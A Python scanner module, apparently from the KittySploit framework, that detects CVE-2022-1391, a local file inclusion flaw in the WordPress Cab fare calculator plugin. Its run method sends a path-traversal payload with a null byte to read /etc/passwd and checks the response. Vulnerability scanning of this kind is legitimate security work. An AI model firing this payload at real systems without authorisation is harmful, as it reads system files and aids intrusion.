#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Cab fare calculator WordPress plugin before 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Cab fare calculator < 1.0.4 - Local File Inclusion Detection',
        'description': 'The Cab fare calculator WordPress plugin before 1.0.4 does not validate the controller parameter before using it in require statements, which could lead to Local File Inclusion issues.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wordpress', 'wp-plugin', 'lfi', 'wp', 'edb', 'wpscan', 'kanev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/50843',
            'https://wordpress.org/plugins/cab-fare-calculator',
            'https://wpscan.com/vulnerability/680121fe-6668-4c1a-a30d-e70dd9be5aac',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-1391',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-1391',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/cab-fare-calculator/tblight.php?controller=../../../../../../../../../../../etc/passwd%00&action=1&ajax=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="WordPress Cab fare calculator < 1.0.4 - Local File Inclusion detected",
                path='/wp-content/plugins/cab-fare-calculator/tblight.php?controller=../../../../../../../../../../../etc/passwd%00&action=1&ajax=1',
            )
            return True
        return False

